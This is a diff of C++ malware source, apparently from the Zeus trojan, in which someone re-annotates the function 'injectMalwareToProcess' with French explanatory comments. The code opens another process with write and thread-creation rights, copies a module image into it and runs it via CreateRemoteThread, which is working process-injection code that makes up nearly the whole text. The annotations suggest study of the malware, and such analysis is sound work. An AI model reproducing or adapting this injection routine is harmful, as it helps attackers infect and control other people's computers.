@@ -15,7 +15,8 @@ extern const char baseConfigSource[sizeof(BASECONFIG)] = {'B', 'A', 'S', 'E', 'C
 static bool injectMalwareToProcess(DWORD pid, HANDLE processMutex, DWORD proccessFlags)
 {
   bool ok = false;
-// teste d’avoir accès au processus pid (à partir de kernel32, processus système) avec ces droits, (test de vulnérabilité)
+
+  // Ouvre le processus avec le pid passé en parametre à partir de l'API windows avec ces droits : test de vulnérabilité
   HANDLE process = CWA(kernel32, OpenProcess)(PROCESS_QUERY_INFORMATION |    
                                               PROCESS_VM_OPERATION |
                                               PROCESS_VM_WRITE |
@@ -23,25 +24,28 @@ static bool injectMalwareToProcess(DWORD pid, HANDLE processMutex, DWORD procces
                                               PROCESS_CREATE_THREAD |
                                               PROCESS_DUP_HANDLE,
                                               FALSE, pid);
- // si on réussit  à avoir accès
+  // si on réussit  à avoir accès
   if(process != NULL)
   {
-void *newImage = MainCore::initNewModule(process, processMutex, proccessFlags); // créer une image de pid
+    void *newImage = MainCore::initNewModule(process, processMutex, proccessFlags); // créer une image de pid
     if(newImage != NULL)
     {
+      // proc est un pointeur sur une fonction qui averti qu'un thread à commencé à s'éxécuter.	
       LPTHREAD_START_ROUTINE proc = (LPTHREAD_START_ROUTINE)((LPBYTE)newImage + (DWORD_PTR)((LPBYTE)MainCore::_injectEntryForThreadEntry - (LPBYTE)coreData.modules.current));
-// create a thread that runs in the virtual address space of kernel 32, genre ça copie le processus précédent ?
+      // CreateRemoteThread est utilisé pour lancer un nouveau thread dans l'adresse mémoire du processus process : ATTAQUE PAR INJECTION DLL WINDOWS
       HANDLE thread = CWA(kernel32, CreateRemoteThread)(process, NULL, 0, proc, NULL, 0, NULL);
  
       if(thread != NULL)
       {
         WDEBUG2(WDDT_INFO, "newImage=0x%p, thread=0x%08X", newImage, thread);
-        // attend 10 sec, si pas reussi a créer le remote thread alors pb
-if(CWA(kernel32, WaitForSingleObject)(thread, 10 * 1000) != WAIT_OBJECT_0)
+
+        // si le HANDLE thread est dans l'état signalé en moisn de 10 sec
+	if(CWA(kernel32, WaitForSingleObject)(thread, 10 * 1000) != WAIT_OBJECT_0)
         {
           WDEBUG2(WDDT_WARNING, "Failed to wait for thread end, newImage=0x%p, thread=0x%08X", newImage, thread);
         }
-// ferme l’open object
+
+        // ferme l’objet HANDLE
         CWA(kernel32, CloseHandle)(thread);
         ok = true; // on a réussi à infecter le processus pid 
       }
@@ -55,7 +59,8 @@ if(CWA(kernel32, WaitForSingleObject)(thread, 10 * 1000) != WAIT_OBJECT_0)
     // si (newImage = NULL)
     else WDEBUG1(WDDT_ERROR, "Failed to alloc code in process with id=%u.", pid);
 #   endif
- // ferme l’open object
+
+    // ferme l’objet HANDLE
     CWA(kernel32, CloseHandle)(process);
   }
 #if(BO_DEBUG > 0)
